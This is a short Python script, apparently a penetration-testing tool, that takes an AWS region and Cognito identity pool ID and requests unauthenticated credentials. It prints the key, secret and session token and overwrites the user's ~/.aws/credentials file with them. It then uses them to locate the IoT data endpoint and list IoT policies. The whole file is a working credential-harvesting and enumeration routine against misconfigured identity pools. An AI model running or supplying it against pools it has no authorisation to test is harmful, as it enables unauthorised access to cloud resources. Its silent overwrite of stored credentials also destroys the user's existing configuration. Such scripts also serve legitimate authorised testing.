#!/bin/python3
#E.g. python iam_unauth.py us-west-2 xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
import boto3
from botocore.config import Config
import os
from sys import argv

PAGE_SIZE=10

def saveCredential(j):
    tup = (j['AccessKeyId'],j['SecretKey'],j['SessionToken'])
    cred ='''\
[default]
aws_access_key_id = %s
aws_secret_access_key = %s
aws_session_token = %s
    ''' % tup
    print(f'[+] Save credential:\n{cred}')
    with open(f'{os.environ["HOME"]}/.aws/credentials','w') as f:
        f.write(cred)
    return boto3.Session(aws_access_key_id=tup[0],
                         aws_secret_access_key=tup[1],
                         aws_session_token=tup[2])

def idpoolid2cred_unauth(region,poolid):
    config = Config(region_name = region)
    cognito = boto3.client('cognito-identity',config=config)
    r = cognito.get_id(IdentityPoolId=f'{region}:{poolid}')
    idid = r['IdentityId']
    print(f'[+] Get identity id:{idid}')
    r = cognito.get_credentials_for_identity(IdentityId = idid)
    sess = saveCredential(r['Credentials'])
    print(f'[+] Get IoT ATS endpoint...')
    iot = sess.client('iot',config=config)
    r = iot.describe_endpoint(
        endpointType='iot:Data-ATS'
    )
    print(r['endpointAddress'])
    print(f'[+] Testing list policies...')
    r = iot.list_policies(
        pageSize=PAGE_SIZE,
        ascendingOrder=True
    )
    print(r['policies'])

if __name__ == '__main__':
    if len(argv) < 3:
        print('[-] Expect region and pool id')
        exit(1)
    region = argv[1]
    poolid = argv[2]
    idpoolid2cred_unauth(region,poolid)
